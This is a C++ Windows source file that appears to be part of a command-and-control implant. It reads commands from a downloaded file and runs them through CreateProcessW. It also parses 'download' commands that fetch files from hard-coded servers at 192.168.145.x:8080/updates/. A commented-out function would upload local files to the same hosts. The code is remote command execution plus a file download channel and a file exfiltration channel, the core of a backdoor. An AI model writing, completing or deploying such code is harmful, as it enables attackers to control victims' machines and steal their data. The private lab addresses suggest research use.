#include "file_operations.h"
#include "bits_operations.h"
#include <iostream>
#include <string>
#include <random>
#include <ctime>
#include <fstream>
#include <windows.h>
#include <regex>  // Include regex header for pattern matching
#include <vector>

std::wstring tempCommand = L"";

// Function to generate a random filename like 'ksfjs32dj4545kf.txt'
std::wstring GenerateRandomFilename() {
    const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
    std::wstring filename;
    const int length = 16;  // Length of the random string before the extension
    std::mt19937 rng(static_cast<unsigned int>(time(0)));  // Seed with current time
    std::uniform_int_distribution<int> dist(0, wcslen(charset) - 1);

    for (int i = 0; i < length; ++i) {
        filename += charset[dist(rng)];
    }

    filename += L".txt";  // Append the .txt extension
    return filename;
}

// Read a command from the file
std::wstring readCommentFromFile(const std::wstring& filePath) {
    std::wifstream file(filePath);  // Open file in wide-character mode

    // Check if file is opened successfully
    if (!file.is_open()) {
        std::wcerr << L"Error opening file: " << filePath << std::endl;
        return L"";  // Return empty string on error
    }

    std::wstring command;
    std::getline(file, command);  // Read the first line (which is assumed to be the comment)

    file.close();  // Close the file after reading

    return command;  // Return the command/comment read from the file
}

// Function to check if the command is a download command and parse it
bool IsDownloadCommand(const std::wstring& command) {
    std::wstring remoteUrl;
    std::wstring localPath;
    std::vector<std::wstring> remoteUrls = {
        L"http://192.168.145.132:8080/updates/",
        L"http://192.168.145.140:8080/updates/",
    };

    std::wregex downloadPattern(L"^download\\s+([^\s]+)\\s+\"?([^\"]+)\"?$");
    std::wsmatch matches;

    // Match the command with the regex pattern
    if (std::regex_match(command, matches, downloadPattern)) {
        std::wstring fileName = matches[1].str();  // Extract the file name
        localPath = matches[2].str();  // Extract the local path

        // Attempt to construct the full remote URL by appending the filename to each base URL
        // and try to download from each until one succeeds

        for (const auto& url : remoteUrls) {
            remoteUrl = url + fileName;  // Construct the full remote URL

            // Attempt to download using this URL
            std::wcout << L"Attempting to download from: " << remoteUrl << std::endl;

            if (DownloadFile(remoteUrl, localPath)) {
                std::wcout << L"Download started successfully from: " << remoteUrl << std::endl;
                return true;  // Return true once a valid server is found and download starts
            }
        }

        // If no server was successful
        std::wcerr << L"All servers are down or unable to download the file." << std::endl;
        return false;
    }

    return false;  // Return false if the command doesn't match the pattern
}

//// Function to check if the command is a download command and parse it
//bool IsUploadCommand(const std::wstring& command) {
//    std::wstring remoteUrl;
//    std::wstring localPath;
//    std::vector<std::wstring> remoteUrls = {
//        L"http://192.168.145.132:8080/uploads/",
//        L"http://192.168.145.140:8080/uploads/",
//    };
//
//    std::wregex uploadPattern(L"^upload\\s+([^\s]+)\\s+\"?([^\"]+)\"?$");
//    std::wsmatch matches;
//
//    // Match the command with the regex pattern
//    if (std::regex_match(command, matches, uploadPattern)) {
//        localPath = matches[2].str();  // Extract the local path
//
//        // Attempt to construct the full remote URL by appending the filename to each base URL
//        // and try to download from each until one succeeds
//
//        for (const auto& url : remoteUrls) {
//
//            // Attempt to download using this URL
//            std::wcout << L"Attempting to download from: " << url << std::endl;
//
//            if (UploadFile(localPath, url)) {
//                std::wcout << L"Download started successfully from: " << url << std::endl;
//                return true;  // Return true once a valid server is found and download starts
//            }
//        }
//
//        // If no server was successful
//        std::wcerr << L"All servers are down or unable to download the file." << std::endl;
//        return false;
//    }
//
//    return false;  // Return false if the command doesn't match the pattern
//}


void ExecuteCommandFromFile(const std::wstring& localFile) {
    std::wstring command = readCommentFromFile(localFile);  // Read the command from file
 
    if (!command.empty()) {
        std::wcout << L"Command from File: " << command << std::endl;

        if (command != tempCommand) {
            // Prepare to execute the command
            STARTUPINFO si = { 0 };
            PROCESS_INFORMATION pi = { 0 };
            si.cb = sizeof(si);

            IsDownloadCommand(command);  // Check if the command is a download command

            // Create the process
            BOOL hr = CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (hr == 0) {
                std::wcerr << L"Failed to execute command. Error: " << GetLastError() << std::endl;
            }
            else {
                // Wait for the process to exit (optional)
                WaitForSingleObject(pi.hProcess, INFINITE);

                // Close handles
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                tempCommand = command;
            }
        }
    }
    else {
        std::wcerr << L"No command found in File." << std::endl;
    }
}